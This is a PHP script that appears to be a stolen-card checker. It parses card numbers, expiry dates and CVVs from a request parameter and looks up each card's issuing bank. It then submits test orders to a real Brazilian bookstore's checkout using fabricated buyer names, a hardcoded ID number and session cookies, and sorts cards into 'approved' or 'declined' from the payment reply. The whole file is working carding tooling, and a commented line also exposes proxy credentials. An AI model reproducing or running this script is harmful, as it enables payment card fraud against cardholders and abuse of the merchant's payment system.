<?php
$time = time();

    error_reporting(0);
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function puxar($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }
$bin1 = substr($cc, 0, 6); 
$file = 'bins.csv'; 
$searchfor = $bin1; 
$contents = file_get_contents($file); 
$pattern = preg_quote($searchfor, '/'); 
$pattern = "/^.*$pattern.*\$/m"; 
if (preg_match_all($pattern, $contents, $matches)) { 
    $encontrada = implode("\n", $matches[0]); 
}
$pieces = explode(";", $encontrada); 
$c = count($pieces);
if ($c == 8) { 
    $pais = $pieces[4]; 
    $paiscode = $pieces[5]; 
    $banco = $pieces[2]; 
    $level = $pieces[3]; 
    $bandeira = $pieces[1]; 
} else { 
    $pais = $pieces[5]; 
    $paiscode = $pieces[6]; 
    $link = $pieces[7]; 
    $level = $pieces[4]; 
    $banco = $pieces[2]; 
    $bandeira = $pieces[1]; 
}


$nominho = array("Marcos Silva", "Vinicius Arantes", "Flavio Mesquita", "Antonio Salles", "Marcos do Carmo", "Renato Viana");
$gerar_nomes = $nominho[array_rand($nominho)];

if (file_exists(getcwd()."/cookies.txt")) {
        unlink(getcwd()."/cookies.txt");
    }


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, "https://livrarialira.com.br/onepage/json/saveOrder");
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
#curl_setopt($ini, CURLOPT_PROXY, "http://p.webshare.io:80");
#curl_setopt($ini, CURLOPT_PROXYUSERPWD, "hemgxgwd-rotate:f9wg50bnlhmh");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_HTTPHEADER, array(

'Accept: application/json, text/javascript, */*; q=0.01',
'Connection: keep-alive',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Cookie: frontend_cid=i3YDjQ5n9U8zFdo3; external_no_cache=1; __utma=113434650.1416095949.1658274483.1658274483.1658274483.1; __utmc=113434650; __utmz=113434650.1658274483.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; frontend=e85bbt0cc9c5fupfflu0ni95u6; __atuvc=1%7C29; __atuvs=62d742f4ed2f000b000; __utmb=113434650.13.10.1658274483',
'Host: livrarialira.com.br',
'Origin: https://livrarialira.com.br',
'Referer: https://livrarialira.com.br/onepage/',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.74',
'X-Requested-With: XMLHttpRequest'

));
curl_setopt($ini, CURLOPT_POSTFIELDS, 'payment%5Bmethod%5D=mozg_cielo_api_cc&payment%5Bgrand_total%5D=16.5&payment%5Bsender_hash%5D=&payment%5Bcc_type%5D=VI&payment%5Bcc_number%5D='.$cc.'&payment%5Bcc_owner%5D='.$gerar_nomes.'&payment%5Bsocial_security_number%5D=93559496853&payment%5Bcc_exp_month%5D='.$mes.'&payment%5Bcc_exp_year%5D='.$ano.'&payment%5Bcc_cid%5D='.$cvv.'&payment%5Bnumber_of_installments%5D=1&agreement%5B1%5D=1&is_subscribed=0&customer_comment=');
 echo $meupiru = curl_exec($ini);
//$id_do_carai = puxar($exec, '"id": "', '"');



$retorno = puxar($meupiru, '"error":"','"');



if(strpos($meupiru, "Autorizacao negada")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> $retorno » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

}

elseif(strpos($meupiru, "Nem todos os produtos est\u00e3o dispon\u00edveis na quantidade solicitada")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> $retorno » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

}

elseif(strpos($meupiru, "400 Bad Request")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> 404 Bad Request » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

}

elseif(strpos($meupiru, "Transação não permitida.")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span>  Transação não permitida. Houve uma falha na validação dos dados. reveja os dados informados e tente novamente. Se o erro persistir entre em contato com a Loja Virtual. » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

}
elseif(strpos($meupiru, "(Aprovada)")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span>  Retorno BODI..! » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

}

else{

    echo "<span class='badge badge-success'>#Aprovada</span> ✔ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> https:\/\/livrarialira.com.br\/checkout\/onepage\/success\/ (Aprovada) » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

}

?>